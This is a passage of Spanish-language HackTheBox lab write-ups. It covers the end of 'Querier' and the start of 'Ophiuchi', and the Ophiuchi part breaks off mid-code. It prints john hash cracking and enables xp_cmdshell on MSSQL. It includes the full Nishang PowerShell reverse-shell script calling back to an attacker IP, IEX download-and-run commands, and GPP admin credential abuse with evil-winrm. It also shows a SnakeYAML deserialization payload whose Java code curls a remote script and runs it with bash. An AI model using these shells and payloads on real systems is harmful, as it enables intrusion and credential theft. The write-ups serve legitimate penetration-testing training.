&lt;p&gt;Obtuvimos un hash correspondiente al usario &lt;code&gt;mssql-svc&lt;/code&gt; el cual trataremos de crackearlo con &lt;code&gt;john&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
1g 0:00:00:37 DONE (2023-03-25 15:30) 0.02700g/s 241965p/s 241965c/s 241965C/s correforenz..cornamuckla
Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;John&lt;/code&gt; logra obtener la contraseña en texto claro y ahora contamos con nuevas credenciales que podemos probar:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;usuario: mssql-svc&lt;/li&gt;
  &lt;li&gt;password: corporate568&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Volvemos a validar la contraseña con &lt;code&gt;crackmapexec&lt;/code&gt;y efectivamente son validas:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.125 -u 'mssql-svc' -p 'corporate568' -d WORKGROUP
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\mssql-svc:corporate568
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que ahora disponemos de credenciales del usuario &lt;code&gt;mssql-svc&lt;/code&gt; quiero pensar que me puedo conectar con &lt;code&gt;mssqlclient.py&lt;/code&gt; y que este contara con mayores privilegios y esta vez si que podremos ejecutar comandos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL&amp;gt; sp_configure 'xp_cmdshell', 1
[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
SQL&amp;gt; sp_configure 'show_advanced', 1
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL&amp;gt; reconfigure
SQL&amp;gt; sp_configure 'xp_cmdshell', 1
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL&amp;gt; reconfigure
SQL&amp;gt; xp_cmdshell &quot;whoami&quot;
output                                                                             

--------------------------------------------------------------------------------   

querier\mssql-svc                                                                  

NULL                                                                               

SQL&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esta vez si conseguimos ejecutar comandos, lo siguiente sera ganar acceso con una consola en powershell y movernos mas comodamente desde nuestra maquina victima, y para ello usaremos `
Invoke-PowerShellTcp.ps1 ` del repositorio de &lt;code&gt;Nishang&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/samratashok/nishang&quot;&gt;https://github.com/samratashok/nishang&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Editaremos la linea final del script y al ejecutarlo con &lt;code&gt;Iex&lt;/code&gt; nos interprete el script incluida la linea final de ese modo matamos dos pajaros de un tiro:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;function Invoke-PowerShellTcp 
{ 
&amp;lt;#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner &amp;amp; Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS &amp;gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS &amp;gt; Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS &amp;gt; Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#&amp;gt;      
    [CmdletBinding(DefaultParameterSetName=&quot;reverse&quot;)] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName=&quot;bind&quot;)]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;bind&quot;)]
        [Int]
        $Port,

        [Parameter(ParameterSetName=&quot;reverse&quot;)]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName=&quot;bind&quot;)]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes(&quot;Windows PowerShell running as user &quot; + $env:username + &quot; on &quot; + $env:computername + &quot;`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n&quot;)
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&amp;gt;')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2&amp;gt;&amp;amp;1 | Out-String )
            }
            catch
            {
                Write-Warning &quot;Something went wrong with execution of command on the target.&quot; 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&amp;gt; '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning &quot;Something went wrong! Check if the server is reachable and you are using the correct port.&quot; 
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.4 -Port 443
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seguidamente procedemos a montarnos un servidor local con python donde alojaremos el script &lt;code&gt;Invoke-PowerShellTcp.ps1&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 Invoke-PowerShellTcp.ps1   Report.xlsm
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos la instruccion con &lt;code&gt;xp_cmdshell&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;SQL&amp;gt; xp_cmdshell &quot;powershell IEX(New-Object Net.WebClient).downloadString(\&quot;http://10.10.16.4/Invoke-PowerShellTcp.ps1\&quot;)&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Nos ponemos en escucha con &lt;code&gt;ncat&lt;/code&gt; en puerto &lt;code&gt;443&lt;/code&gt; y ganamos acceso al sistema:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.125.
Ncat: Connection from 10.10.10.125:49681.
Windows PowerShell running as user mssql-svc on QUERIER
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32&amp;gt;whoami
querier\mssql-svc
PS C:\Windows\system32&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;AHora vamos al directorio personal del usuario y visializamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;PS C:\Windows\system32&amp;gt;cd C:\Users\
PS C:\Users&amp;gt; dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/28/2019  10:17 PM                Administrator                                                         
d-----        1/28/2019  11:42 PM                mssql-svc                                                             
d-r---        1/28/2019  10:17 PM                Public                                                                


PS C:\Users&amp;gt; cd mssql-svc
PS C:\Users\mssql-svc&amp;gt; cd Desktop
PS C:\Users\mssql-svc\Desktop&amp;gt; type user.txt
089b86d375c2a51f4aae02b9a984a9ee
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Una vez dentro ejecutamos el comando &lt;code&gt;whoami /priv&lt;/code&gt; y vemos que tenemos activado el &lt;code&gt;SeImpersonatePrivilege&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;PS C:\Windows\system32&amp;gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podriamos utilizar &lt;code&gt;JuicyPotato&lt;/code&gt;, pero esta vez vamos a usar &lt;code&gt;PowerUp.ps1&lt;/code&gt; de &lt;code&gt;powersploit&lt;/code&gt; para enumerar el sistema.&lt;/p&gt;

&lt;p&gt;Nos volvemos a compartir un servidor web con &lt;code&gt;python3&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 Invoke-PowerShellTcp.ps1   PowerUp.ps1   Report.xlsm
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y ejecutamos con &lt;code&gt;Iex&lt;/code&gt; la instraccion para ejecutar e interpretar el script en la maquina victima y hacer un reconocimiento total:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;PS C:\Windows\system32&amp;gt; Iex(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerUp.ps1')
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez ejecutado esperamos un poco y el sistema nos enumera unas credenciales Administrativas del archivo &lt;code&gt;Groups.xml&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;PS C:\Windows\system32&amp;gt; Iex(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerUp.ps1')


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2468
ProcessId   : 3744
Name        : 3744
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a proceder a validar si las credenciales corresponden al usuario &lt;code&gt;Administrador&lt;/code&gt; y efectivamente asi es:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUP
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\Administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora podemos hacer uso del puerto &lt;code&gt;5985&lt;/code&gt; servicio de administracion remota de windows con la ayuda de &lt;code&gt;evil-winrm&lt;/code&gt; nos dirigimos al directorio del usuario &lt;code&gt;Administrator&lt;/code&gt; y podemos visualiar la segunda flag &lt;code&gt;root.txt&lt;/code&gt; :).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -i 10.10.10.125

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt
6d6c9abc4b5ecfaf4587047710b1bbb3
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Querier</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Querier</guid>
        
        <category>cached gpp</category>
        
        <category>shared files</category>
        
        <category>abussingmysql</category>
        
        <category>macroinspection</category>
        
        <category>Active Directory</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Ophiuchi - htb writeup</title>
        <description>&lt;p&gt;Hoy vamos a hacer una máquina &lt;code&gt;hackthebox&lt;/code&gt; de dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de deserialización de &lt;code&gt;YAML&lt;/code&gt; para &lt;code&gt;SnakeYAML&lt;/code&gt; utilizada en aplicaciones java, y modificando un archivo &lt;code&gt;wasm&lt;/code&gt; para obtener privilegios de &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Ophiuchi
❯ ls
 Ophiuchi
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.227
PING 10.10.10.227 (10.10.10.227) 56(84) bytes of data.
64 bytes from 10.10.10.227: icmp_seq=1 ttl=63 time=124 ms

--- 10.10.10.227 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 124.383/124.383/124.383/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.227 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-24 21:16 GMT
Initiating SYN Stealth Scan at 21:16
Scanning 10.10.10.227 [65535 ports]
Discovered open port 8080/tcp on 10.10.10.227
Discovered open port 22/tcp on 10.10.10.227
Completed SYN Stealth Scan at 21:17, 18.29s elapsed (65535 total ports)
Nmap scan report for 10.10.10.227
Host is up, received user-set (0.15s latency).
Scanned at 2023-03-24 21:16:59 GMT for 18s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.46 seconds
           Raw packets sent: 90294 (3.973MB) | Rcvd: 90276 (3.611MB)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Podemos ver que los puertos que se encuentran abiertos son el puerto 22 ssh y el 8080 http.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,8080 10.10.10.227 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-24 21:21 GMT
Nmap scan report for 10.10.10.227
Host is up (0.27s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.57 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 8.2p1 Ubuntu 4ubuntu0.1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8080&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache Tomcat 9.0.38&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;website---tcp-8080&quot;&gt;Website - TCP 8080&lt;/h2&gt;

&lt;p&gt;Vamos a usar la herramienta &lt;code&gt;whatweb&lt;/code&gt; para ver por consola el gestor de contenido de la pagina web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ whatweb http://10.10.10.227:8080
http://10.10.10.227:8080 [200 OK] Cookies[JSESSIONID], Country[RESERVED][ZZ], HttpOnly[JSESSIONID], IP[10.10.10.227], Java, Title[Parse YAML]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El comando nos reporta algo interesante &lt;code&gt;Parse YAML&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Vamos a abrir la web y vemos que la pagina efectivamente es un &lt;code&gt;Yaml Parser&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Ophiuchi/web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a realizar una busqueda para ver si hay un exploit o vulnerabilidad relacionado a &lt;code&gt;Yaml Parser&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Encontramos un exploit publico en un repositorio de &lt;code&gt;github&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/artsploit/yaml-payload&quot;&gt;https://github.com/artsploit/yaml-payload&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;El exploit nos habla sobre deserializacion, pero que es deserializacion?&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Serializacion: Se refiere a un proceso por el cual se pasan un conjunto de bytes a un objeto entendible.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;En este repositorio nos habla de que mediante una deserealizacion insegura podemos conseguir &lt;code&gt;RCE&lt;/code&gt; “ejecucion remota de comandos”:&lt;/p&gt;

&lt;p&gt;Basicamente se explota cuando una pagina tiene la funcion de parsear un archivo &lt;code&gt;YAML&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;¿Pero como lo validamos entonces?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Pues en el repositorio nos muestra un codigo en &lt;code&gt;yaml&lt;/code&gt; que podemos parsear en la web donde al ejecutarse podemos aprovecharlo para ejecutar una peticion a nuestra maquina.&lt;/p&gt;

&lt;p&gt;Para lo cual primero debemos montarnos un servidor web, usaremos &lt;code&gt;python&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Ophiuchi/web4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues realizamos el parseo:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Ophiuchi/web3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y vemos como efectivamente recibimos una peticion.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Ophiuchi/web5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Al buscar el CVE encotramos un articulo sobre la vulnerabilidad:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2017-1000207&quot;&gt;CVE-2017-1000207 / Vuln in Swagger Parser and Swagger Codegen, YAML parsing results arbitrary code execution&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Bueno entonces al pasarle nuestro payload &lt;code&gt;SNAKE YAML&lt;/code&gt; llamara al constructor &lt;code&gt;ScriptEngineFactory&lt;/code&gt; y este a su vez realizara una peticion a nuestra maquina.&lt;/p&gt;

&lt;p&gt;Vamos a descargar el repositorio que genera los payloads para poder ejecutar codigo en el sistema:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/artsploit/yaml-payload&quot;&gt;https://github.com/artsploit/yaml-payload&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Hacemos la clonacion del repositorio:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git clone https://github.com/artsploit/yaml-payload
Clonando en 'yaml-payload'...
remote: Enumerating objects: 10, done.
remote: Total 10 (delta 0), reused 0 (delta 0), pack-reused 10
Recibiendo objetos: 100% (10/10), listo.
❯ ls
 yaml-payload   2021-07-03-ophiuchi.md

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;El exploit nos dice que debemos poner el codigo que deseamos ejecutar en &lt;code&gt;AwesomeScriptEngineFactory.java&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tree
.
├── 2021-07-03-ophiuchi.md
└── yaml-payload
    ├── README.md
    └── src
        ├── artsploit
        │   └── AwesomeScriptEngineFactory.java
        └── META-INF
            └── services
                └── javax.script.ScriptEngineFactory

5 directories, 4 files
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Observamos que se encuentra ahi el script &lt;code&gt;AwesomeScriptEngineFactory.java&lt;/code&gt; lo abrimos y procedemos a modificar el codigo que queremos ejecutar&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec(&quot;curl http://10.10.16.4/reverse.sh -o /tmp/reverse.sh&quot;);
            Runtime.getRuntime().exec(&quot;bash /tmp/reverse.sh&quot;);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
